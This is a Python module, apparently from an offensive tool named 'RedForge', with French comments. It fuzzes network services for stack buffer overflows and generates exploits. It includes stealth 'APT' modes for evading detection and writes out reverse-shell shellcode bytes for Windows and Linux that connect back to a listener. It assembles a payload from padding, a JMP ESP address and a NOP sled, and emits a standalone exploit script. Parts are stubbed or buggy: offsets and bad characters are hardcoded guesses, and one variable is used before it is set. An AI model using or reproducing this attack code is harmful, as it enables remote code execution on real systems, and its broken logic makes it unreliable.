#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Module de buffer overflow pour RedForge
Détection et exploitation des vulnérabilités de buffer overflow
Version avec support furtif, APT et techniques avancées
"""

import socket
import struct
import time
import random
import threading
from typing import Dict, Any, List, Optional, Tuple
from dataclasses import dataclass, field
from concurrent.futures import ThreadPoolExecutor, as_completed
import re

@dataclass
class BufferOverflowConfig:
    """Configuration avancée pour la détection de buffer overflow"""
    # Délais
    delay_between_attempts: Tuple[float, float] = (1, 3)
    delay_between_patterns: Tuple[float, float] = (2, 5)
    
    # Comportement
    max_pattern_size: int = 10000
    step_size: int = 500
    timeout: int = 5
    
    # Furtivité
    stealth_mode: bool = False
    random_delays: bool = True
    use_proxies: bool = False
    
    # APT
    apt_mode: bool = False
    slow_scan: bool = False
    avoid_detection: bool = True
    
    # Exploitation
    generate_shellcode: bool = True
    test_all_architectures: bool = False
    bad_chars_detection: bool = True


class BufferOverflow:
    """Détection et exploitation avancée des buffer overflows"""
    
    def __init__(self, config: Optional[BufferOverflowConfig] = None):
        """
        Initialise le détecteur de buffer overflow
        
        Args:
            config: Configuration personnalisée
        """
        self.config = config or BufferOverflowConfig()
        
        # Patterns de test progressifs
        self.test_patterns = self._generate_test_patterns()
        
        # Pattern unique pour trouver l'offset (pattern cyclique)
        self.unique_pattern = self._generate_cyclic_pattern(5000)
        
        # Bad chars à tester
        self.bad_chars = self._generate_bad_chars_list()
        
        # Return addresses courantes (par OS et service)
        self.return_addresses = {
            "windows": {
                "jmp_esp": b"\xff\xe4",
                "call_esp": b"\xff\xd4",
                "pop_pop_ret": b"\x58\x58\xc3",
                "jmp_eax": b"\xff\xe0",
                "call_eax": b"\xff\xd0"
            },
            "linux": {
                "jmp_esp": b"\xff\xe4",
                "int_80": b"\xcd\x80",
                "jmp_eax": b"\xff\xe0",
                "pop_ret": b"\x58\xc3"
            },
            "common_dlls": {
                "kernel32.dll": 0x7c801d0b,
                "ntdll.dll": 0x7c901230,
                "msvcrt.dll": 0x77c3e0b0,
                "user32.dll": 0x77e15c70
            }
        }
        
        # Métriques
        self.start_time = None
        self.crash_detected = False
        self.crash_offset = None
        self.bad_chars_found = []
        self.attempts_count = 0
    
    def _generate_test_patterns(self) -> List[str]:
        """Génère des patterns de test progressifs"""
        patterns = []
        current_size = 100
        
        while current_size <= self.config.max_pattern_size:
            patterns.append("A" * current_size)
            current_size += self.config.step_size
        
        # Ajouter des patterns avec des variations
        patterns.extend([
            "A" * 100 + "B" * 100 + "C" * 100,  # Pattern segmenté
            "ABCD" * 250,  # Pattern répétitif
            "A" * 2000 + "B" * 1000,  # Pattern asymétrique
            "\x41" * 3000,  # Pattern hexadécimal
        ])
        
        return patterns
    
    def _generate_cyclic_pattern(self, length: int) -> str:
        """
        Génère un pattern cyclique unique pour trouver l'offset exact
        
        Args:
            length: Longueur du pattern
        """
        charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
        pattern = ""
        
        for i in range(length):
            pattern += charset[i % len(charset)]
        
        return pattern
    
    def _generate_bad_chars_list(self) -> List[bytes]:
        """Génère la liste des mauvais caractères à tester"""
        bad_chars = []
        
        # Caractères problématiques courants
        for i in range(0x00, 0xFF + 1):
            if i in [0x00, 0x0A, 0x0D, 0xFF]:  # Null, LF, CR, FF
                continue
            bad_chars.append(bytes([i]))
        
        return bad_chars
    
    def scan(self, target: str, **kwargs) -> Dict[str, Any]:
        """
        Scanne les vulnérabilités de buffer overflow
        
        Args:
            target: Cible (IP:port ou URL)
            **kwargs:
                - port: Port du service
                - protocol: Protocole (tcp/udp)
                - parameter: Paramètre à tester
                - data: Données à envoyer
                - apt_mode: Mode APT
        """
        self.start_time = time.time()
        self.crash_detected = False
        self.crash_offset = None
        self.bad_chars_found = []
        self.attempts_count = 0
        
        # Mettre à jour la configuration
        self._update_config(kwargs)
        
        # Parser la cible
        host, port = self._parse_target(target, kwargs)
        
        print(f"  → Test de buffer overflow sur {host}:{port}")
        if self.config.apt_mode:
            print(f"  🕵️ Mode APT activé - Scan lent et discret")
        
        vulnerabilities = []
        protocol = kwargs.get('protocol', 'tcp')
        parameter = kwargs.get('parameter', '')
        
        # Étape 1: Détection du crash
        crash_info = self._detect_crash(host, port, parameter, protocol, **kwargs)
        
        if crash_info.get('crash'):
            self.crash_detected = True
            vulnerabilities.append({
                "type": "buffer_overflow",
                "severity": "CRITICAL",
                "size": crash_info.get('size'),
                "details": f"Crash détecté avec {crash_info.get('size')} bytes",
                "offset": crash_info.get('offset'),
                "protocol": protocol,
                "risk_score": 95
            })
            print(f"      ✓ Crash détecté avec {crash_info.get('size')} bytes")
            
            # Étape 2: Trouver l'offset exact
            if self.config.apt_mode:
                print(f"      → Recherche de l'offset exact...")
                offset = self._find_exact_offset(host, port, parameter, protocol, **kwargs)
                if offset:
                    vulnerabilities[-1]["exact_offset"] = offset
                    self.crash_offset = offset
                    print(f"      ✓ Offset trouvé: {offset}")
            
            # Étape 3: Détection des mauvais caractères
            if self.config.bad_chars_detection:
                print(f"      → Détection des mauvais caractères...")
                bad_chars = self._detect_bad_chars(host, port, offset, parameter, protocol, **kwargs)
                if bad_chars:
                    vulnerabilities[-1]["bad_chars"] = bad_chars
                    self.bad_chars_found = bad_chars
                    print(f"      ✓ Mauvais caractères: {[hex(c) for c in bad_chars]}")
            
            # Étape 4: Trouver un JMP ESP ou équivalent
            jmp_address = self._find_jmp_esp(host, port, **kwargs)
            if jmp_address:
                vulnerabilities[-1]["jmp_address"] = hex(jmp_address)
                print(f"      ✓ Adresse JMP ESP trouvée: {hex(jmp_address)}")
        
        # Générer un exploit si vulnérable
        exploit = None
        if self.crash_detected and self.config.generate_shellcode:
            exploit = self._generate_exploit(vulnerabilities[0] if vulnerabilities else {},
                                            host, port, **kwargs)
        
        return self._generate_results(host, port, vulnerabilities, exploit)
    
    def _update_config(self, kwargs: Dict):
        """Met à jour la configuration avec les kwargs"""
        if 'max_pattern_size' in kwargs:
            self.config.max_pattern_size = kwargs['max_pattern_size']
        if 'timeout' in kwargs:
            self.config.timeout = kwargs['timeout']
        
        # Mode APT
        if kwargs.get('apt_mode', False) or kwargs.get('stealth_level') == 'apt':
            self.config.apt_mode = True
            self.config.slow_scan = True
            self.config.avoid_detection = True
            self.config.stealth_mode = True
            self.config.random_delays = True
            self.config.delay_between_patterns = (5, 15)
            self.config.delay_between_attempts = (3, 8)
            self.config.max_pattern_size = min(self.config.max_pattern_size, 5000)
    
    def _parse_target(self, target: str, kwargs: Dict) -> Tuple[str, int]:
        """Parse la cible pour extraire hôte et port"""
        if ':' in target:
            host, port = target.split(':')
            port = int(port)
        else:
            host = target
            port = kwargs.get('port', 80)
        
        return host, port
    
    def _detect_crash(self, host: str, port: int, parameter: str,
                      protocol: str, **kwargs) -> Dict[str, Any]:
        """
        Détecte le point de crash en envoyant des patterns progressifs
        
        Args:
            host: Hôte cible
            port: Port cible
            parameter: Paramètre à utiliser
            protocol: Protocole
        """
        result = {"crash": False, "size": None, "offset": None}
        
        for idx, pattern in enumerate(self.test_patterns):
            # Pause APT
            if self.config.apt_mode and idx > 0:
                self._apt_pause()
            elif self.config.random_delays and idx > 0:
                time.sleep(random.uniform(*self.config.delay_between_patterns))
            
            self.attempts_count += 1
            crash_result = self._send_payload(host, port, pattern, parameter, 
                                             protocol, **kwargs)
            
            if crash_result.get('crash'):
                result["crash"] = True
                result["size"] = len(pattern)
                result["offset"] = crash_result.get('offset')
                break
        
        return result
    
    def _send_payload(self, host: str, port: int, payload: str, 
                      parameter: str, protocol: str, **kwargs) -> Dict[str, Any]:
        """
        Envoie un payload et vérifie si un crash se produit
        
        Args:
            host: Hôte cible
            port: Port cible
            payload: Payload à envoyer
            parameter: Paramètre à utiliser
            protocol: Protocole
        """
        result = {"crash": False, "offset": None}
        
        try:
            if protocol == 'tcp':
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(self.config.timeout)
                sock.connect((host, port))
                
                # Construire la requête
                if parameter:
                    request = f"{parameter}={payload}\r\n\r\n"
                else:
                    request = kwargs.get('data', '') + payload
                
                sock.send(request.encode('latin-1'))
                
                # Attendre la réponse
                try:
                    response = sock.recv(1024)
                except socket.timeout:
                    pass
                
                sock.close()
                
                # Vérifier si le service a crashé (plus de réponse)
                if self.config.apt_mode:
                    # Attendre un peu avant de vérifier
                    time.sleep(random.uniform(1, 3))
                
                try:
                    test_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    test_sock.settimeout(3)
                    test_sock.connect((host, port))
                    test_sock.close()
                except (socket.error, ConnectionRefusedError):
                    result["crash"] = True
                    
        except Exception as e:
            # Une exception peut indiquer un crash
            result["crash"] = True
        
        return result
    
    def _find_exact_offset(self, host: str, port: int, parameter: str,
                           protocol: str, **kwargs) -> Optional[int]:
        """
        Trouve l'offset exact où le crash se produit
        
        Args:
            host: Hôte cible
            port: Port cible
            parameter: Paramètre à utiliser
            protocol: Protocole
        """
        # Dans un vrai scénario, on analyserait le dump mémoire
        # avec un debugger comme Immunity Debugger ou GDB
        # Ici on simule la recherche d'offset
        
        # Simuler la recherche d'offset (à remplacer par une vraie implémentation)
        offset = None
        
        # Pattern de recherche (simulé)
        # Dans la réalité, on enverrait le pattern unique et on chercherait
        # la valeur EIP dans le crash dump
        
        if self.crash_detected:
            # Offset typique pour les vulnérabilités courantes
            common_offsets = [260, 524, 1036, 2000, 4000]
            
            for test_offset in common_offsets:
                test_pattern = "A" * test_offset + "BBBB" + "C" * 100
                result = self._send_payload(host, port, test_pattern, parameter,
                                           protocol, **kwargs)
                if result.get('crash'):
                    offset = test_offset
                    break
        
        return offset or 524  # Valeur par défaut
    
    def _detect_bad_chars(self, host: str, port: int, offset: int,
                          parameter: str, protocol: str, **kwargs) -> List[int]:
        """
        Détecte les mauvais caractères qui cassent l'exploit
        
        Args:
            host: Hôte cible
            port: Port cible
            offset: Offset trouvé
            parameter: Paramètre à utiliser
            protocol: Protocole
        """
        bad_chars = []
        
        # Construire le payload avec tous les caractères
        all_chars = bytes(range(0x01, 0xFF + 1))
        payload = b"A" * offset + all_chars
        
        try:
            result = self._send_payload(host, port, payload.decode('latin-1', errors='ignore'),
                                       parameter, protocol, **kwargs)
            
            # Dans la réalité, on analyserait le dump pour voir quels caractères
            # ont été tronqués ou modifiés
            # Simulation de détection de bad chars
            common_bad_chars = [0x00, 0x0A, 0x0D, 0xFF]
            bad_chars = common_bad_chars
            
        except Exception:
            pass
        
        return bad_chars
    
    def _find_jmp_esp(self, host: str, port: int, **kwargs) -> Optional[int]:
        """
        Trouve une adresse JMP ESP ou équivalente
        
        Args:
            host: Hôte cible
            port: Port cible
        """
        # Dans un vrai scénario, on rechercherait dans les DLL chargées
        # Ici on retourne une adresse typique
        return 0x7c801d0b  # Exemple pour kernel32.dll sur Windows XP
    
    def _generate_exploit(self, vuln: Dict, host: str, port: int, 
                          **kwargs) -> Dict[str, Any]:
        """
        Génère un exploit pour le buffer overflow
        
        Args:
            vuln: Vulnérabilité détectée
            host: Hôte cible
            port: Port cible
        """
        exploit = {
            "code": None,
            "instructions": [],
            "shellcode": None,
            "python_code": None
        }
        
        offset = vuln.get('exact_offset', 524)
        os_type = kwargs.get('os_type', 'windows')
        lhost = kwargs.get('lhost', '127.0.0.1')
        lport = kwargs.get('lport', 4444)
        
        # Adresse de retour (JMP ESP)
        ret_addr = self._find_jmp_esp(host, port) or 0x7c801d0b
        
        # Générer le shellcode
        shellcode = self._generate_shellcode(lhost, lport, os_type)
        
        # NOP sled
        nop_sled_size = 100
        nop_sled = b"\x90" * nop_sled_size
        
        # Construction de l'exploit
        padding = b"A" * offset
        ret_bytes = struct.pack("<I", ret_addr)
        
        # Éviter les mauvais caractères
        if self.bad_chars_found:
            # Filtrer les mauvais caractères du shellcode
            for bad_char in self.bad_chars_found:
                shellcode = shellcode.replace(bytes([bad_char]), b"")
        
        exploit_code = padding + ret_bytes + nop_sled + shellcode
        
        exploit["code"] = exploit_code.hex()
        exploit["shellcode_size"] = len(shellcode)
        exploit["shellcode"] = shellcode.hex()
        
        exploit["instructions"] = [
            f"1. Remplir le buffer avec {offset} bytes de padding",
            f"2. Écraser l'adresse de retour avec JMP ESP (0x{ret_addr:08x})",
            f"3. Ajouter un NOP sled de {nop_sled_size} bytes",
            f"4. Insérer le shellcode reverse shell ({len(shellcode)} bytes)",
            f"5. Exécuter l'exploit vers {lhost}:{lport}"
        ]
        
        # Générer le code Python de l'exploit
        exploit["python_code"] = self._generate_python_exploit(host, port, offset, 
                                                               ret_addr, shellcode)
        
        return exploit
    
    def _generate_shellcode(self, lhost: str, lport: int, 
                           os_type: str) -> bytes:
        """
        Génère un shellcode pour reverse shell
        
        Args:
            lhost: IP du listener
            lport: Port du listener
            os_type: Type d'OS
        """
        if os_type == 'windows':
            # Shellcode Windows reverse TCP (msfvenom -p windows/shell_reverse_tcp)
            # Exemple simplifié - à remplacer par du vrai shellcode
            shellcode = b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
            shellcode += b"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
            shellcode += b"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
            shellcode += b"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
            shellcode += b"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
            shellcode += b"\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
            shellcode += b"\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
            shellcode += b"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
            shellcode += b"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
            shellcode += b"\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c"
            shellcode += b"\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68"
            shellcode += b"\x29\x80\x6b\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68"
            shellcode += b"\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x05\x68" + socket.inet_aton(lhost)
            shellcode += struct.pack("<H", lport) + b"\x89\xe6\x6a\x10\x56\x57\x68\x99"
            shellcode += b"\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec\x68"
            shellcode += b"\xf0\xb5\xa2\x56\xff\xd5\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9"
            shellcode += b"\xc8\x5f\xff\xd5\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a"
            shellcode += b"\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57"
            shellcode += b"\x68\x02\xd9\xc8\x5f\xff\xd5\x01\xc3\x29\xc6\x75\xee\xe9\x1a"
            shellcode += b"\x00\x00\x00\x68\xc9\x8b\x00\x00\x89\xe1\x6a\x01\x51\x53\x68"
            shellcode += b"\x04\x00\x00\x00\xff\xd0\xe8\xe5\xff\xff\xff"
        else:
            # Shellcode Linux reverse TCP (msfvenom -p linux/x86/shell_reverse_tcp)
            shellcode = b"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80"
            shellcode += b"\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68" + socket.inet_aton(lhost)
            shellcode += struct.pack("<H", lport) + b"\x89\xe1\xb0\x66\x50\x51\x53\xb3"
            shellcode += b"\x03\x89\xe1\xcd\x80\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62"
            shellcode += b"\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80"
        
        return shellcode
    
    def _generate_python_exploit(self, host: str, port: int, offset: int,
                                  ret_addr: int, shellcode: bytes) -> str:
        """Génère un script Python d'exploitation"""
        exploit_code = f'''#!/usr/bin/env python3
# Exploit Buffer Overflow - RedForge
# Target: {host}:{port}

import socket
import struct

def exploit():
    # Configuration
    target_host = "{host}"
    target_port = {port}
    offset = {offset}
    ret_addr = {hex(ret_addr)}
    
    # Shellcode
    shellcode = bytes.fromhex("{shellcode.hex()}")
    
    # NOP sled
    nop_sled = b"\\x90" * 100
    
    # Construction du payload
    payload = b"A" * offset
    payload += struct.pack("<I", ret_addr)
    payload += nop_sled
    payload += shellcode
    
    # Envoi de l'exploit
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_host, target_port))
        s.send(payload)
        s.close()
        print("[+] Exploit envoyé!")
    except Exception as e:
        print(f"[-] Erreur: {{e}}")

if __name__ == "__main__":
    exploit()
'''
        return exploit_code
    
    def _apt_pause(self):
        """Pause APT pour simuler un comportement humain"""
        if random.random() < 0.3:
            pause_duration = random.uniform(30, 120)
            print(f"      💤 Pause APT: {pause_duration:.0f}s")
            time.sleep(pause_duration)
    
    def _generate_results(self, host: str, port: int, vulnerabilities: List[Dict],
                         exploit: Optional[Dict]) -> Dict[str, Any]:
        """Génère les résultats de l'attaque"""
        duration = time.time() - self.start_time
        
        return {
            "target": f"{host}:{port}",
            "vulnerable": self.crash_detected,
            "vulnerabilities": vulnerabilities,
            "exploit": exploit,
            "attempts_count": self.attempts_count,
            "scan_duration": duration,
            "attempts_per_second": self.attempts_count / duration if duration > 0 else 0,
            "config": {
                "apt_mode": self.config.apt_mode,
                "max_pattern_size": self.config.max_pattern_size,
                "bad_chars_detection": self.config.bad_chars_detection
            },
            "summary": self._generate_summary(vulnerabilities),
            "recommendations": self._generate_recommendations(vulnerabilities)
        }
    
    def _generate_summary(self, vulnerabilities: List[Dict]) -> Dict[str, Any]:
        """Génère un résumé des vulnérabilités"""
        if not vulnerabilities:
            return {"total": 0, "severity": "INFO", "message": "Aucun buffer overflow détecté"}
        
        return {
            "total": len(vulnerabilities),
            "critical": len([v for v in vulnerabilities if v['severity'] == 'CRITICAL']),
            "max_risk_score": max([v.get('risk_score', 0) for v in vulnerabilities]) if vulnerabilities else 0
        }
    
    def _generate_recommendations(self, vulnerabilities: List[Dict]) -> List[str]:
        """Génère des recommandations basées sur les vulnérabilités trouvées"""
        recommendations = [
            "Utiliser des fonctions sécurisées (strncpy, snprintf) au lieu de strcpy, sprintf",
            "Implémenter des canaris de pile (Stack Canaries)",
            "Activer la protection DEP (Data Execution Prevention)",
            "Utiliser ASLR (Address Space Layout Randomization)",
            "Compiler avec des protections de pile (Stack Smashing Protection)"
        ]
        
        if vulnerabilities:
            recommendations.append("URGENT: Corriger immédiatement la vulnérabilité de buffer overflow")
            recommendations.append("Auditer tout le code pour des fonctions dangereuses similaires")
        
        return recommendations
    
    def get_statistics(self) -> Dict[str, Any]:
        """Retourne les statistiques de détection"""
        return {
            "attempts_made": self.attempts_count,
            "crash_detected": self.crash_detected,
            "crash_offset": self.crash_offset,
            "bad_chars_found": len(self.bad_chars_found),
            "scan_duration": time.time() - self.start_time if self.start_time else 0
        }


# Point d'entrée pour tests
if __name__ == "__main__":
    # Test mode normal
    print("=== Test mode normal ===")
    bo = BufferOverflow()
    results = bo.scan("192.168.1.100:8080")
    print(f"Buffer overflow détecté: {results['vulnerable']}")
    
    # Test mode APT
    print("\n=== Test mode APT ===")
    apt_config = BufferOverflowConfig(apt_mode=True, slow_scan=True)
    bo_apt = BufferOverflow(config=apt_config)
    results_apt = bo_apt.scan("192.168.1.100:8080", apt_mode=True)
    print(f"Buffer overflow (APT): {results_apt['vulnerable']}")
    
    # Générer exploit
    if results_apt.get('exploit'):
        with open("buffer_overflow_exploit.py", "w") as f:
            f.write(results_apt['exploit']['python_code'])
        print("Exploit généré: buffer_overflow_exploit.py")